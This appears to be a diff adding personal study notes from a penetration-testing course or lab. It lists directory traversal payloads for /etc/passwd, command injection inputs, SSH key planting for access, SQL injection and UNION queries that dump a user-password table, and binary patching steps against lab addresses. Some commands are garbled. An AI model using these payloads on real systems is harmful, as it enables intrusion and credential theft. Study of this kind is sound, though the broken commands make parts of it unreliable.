@@ -1,0 +1,185 @@
+Overview Notes
+
+Ping Sweep command 
+
+Port Scanning
+nmap, nse (http-enum.nse,http-robots.txt.nse,banner.nse)
+nikto -h 172.20.24.239
+
+nmap -v -sT -T4 –script=http.robots.txt.nse
+
+web exploitation
+1.Directory Traversal – information
+.././../../../../etc/passwd
+.././../../../../etc/group
+.././../../../../etc/hosts
+.././../../../../etc/networks
+.././../../../../etc/resolve.conf
+.././../../../../etc/passwd
+
+2. CMD Injection – Information/Access
+; id
+; whoami
+; cat
+;
+
+
+
+ssh key upload
+
+find the default home directory, for the user based off /etc/passwd
+
+now we can generate the ssh public key, and we know where to put it
+
+ssh-keygen -r rsa -b 4096
+
+cat /home/student/.ssh/id_rsa.pub
+
+echo that into the authorized hosts
+
+
+malicious upload
+
+can you upload?
+can you excecute or access the area
+are up laods being sanitized
+can you access
+
+ssh -i .ssh/id_rsa www-data@172.20.24.239
+
+
+
+msfvenom -p windows/exec CMD'cmd.exe /C "whoami" > C:|Users
+
+get method or post methd
+test ' OR 1='1
+
+<value>' or 1='1
+
+<value>' or 1='1;
+
+<value>' or 1='1; #
+
+<value>' or 1='1; --
+
+
+http://10.50.39.57/uniondemo.php?Selection=1&Submit=Submit
+just change the numbers
+
+http://10.50.39.57/uniondemo.php?Selection=1 or 1=1
+http://10.50.39.57/uniondemo.php?Selection=2%20or%201=1
+
+
+http://10.50.39.57/uniondemo.php?Selection=2 or 1=1
+
+http://10.50.39.57/uniondemo.php?Selection=2 or 1='1;
+http://10.50.39.57/uniondemo.php?Selection=2 or 1='1; #
+http://10.50.39.57/uniondemo.php?Selection=2 or 1='1; --
+
+
+golden statement
+
+UNION select table_schema,table_name,column_name from information_schema.columns
+http://10.50.39.57/uniondemo.php?Selection=2%20UNION%20select%20table_schema,table_name,column_name%20from%20information_schema.columns
+
+session	tireid	Tires
+session	name	Tires
+session	size	Tires
+session	cost	Tires
+session	carid	car
+session	name	car
+session	type	car
+session	cost	car
+session	color	car
+session	year	car
+session	session_id	session_log
+session	user_id	session_log
+session	remote_ip	session_log
+session	status	session_log
+session	start	session_log
+session	last_access	session_log
+session	id	user
+session	name	user
+session	pass	user
+session	studentID	userinfo
+session	username	userinfo
+session	passwd	userinfo
+session	linInt	userinfo
+session	prid	userinfo
+session	pin	userinfo
+
+
+http://10.50.39.57/uniondemo.php?Selection=2%20UNION%20select%201,2,3%20from%20user.session
+
+database of databases-hold meta data
+
+colums = table, this table is in the information_schema
+
+table_schema = column lists of databases
+
+table_name = column lists out tables names
+
+colum_name = column lists out column names
+
+UNION select id,name,pass from session.user 
+
+
+
+UNION select 1,2,@@version
+
+
+determine behavior of page
+
+determine if vulnerable via truth statement
+
+determine how many colums exits(UNION select 1,2,3)
+
+determine column number, order and what is hidden
+
+dump the database using golden
+
+extract information
+
+
+
+
+reverse engineering
+
+find a binary, you are curious
+
+run file on it, what type of binary
+srings on it
+
+
+static analysisc
+file, stings
+
+behaviors analaysis 
+run it and see what it does(what does normal look like)
+
+ASCII compared to strings
+
+windows exceutable, wat do we want to do
+IDA or ghidra
+
+gdb on linux with peda
+
+first thing to start with
+strings zero in on part of the program with the startup
+look and see what the condition is(do this or that) 
+figure out the variable or value
+step into the function that returns a certain value
+see the desired input to the program for it to be successful
+test the math out
+
+then move into patching a program in ghidra
+find that IF statement write in the assembly above or below the if statement it will have a JMP, you can easily flip that and look at the psudocode and see everything change
+
+
+run file on it, run strings, inteact with it, tkae note of how it runs and what normal looks like
+start utiling gdb
+
+if it calls for you to exploit a binary with a buffer overflow(gdb with ped) or immunity debugger
+
+when you are reverse engineering it needs to take place on the host, the EIP will be different
+gdb will prob be installed on the box
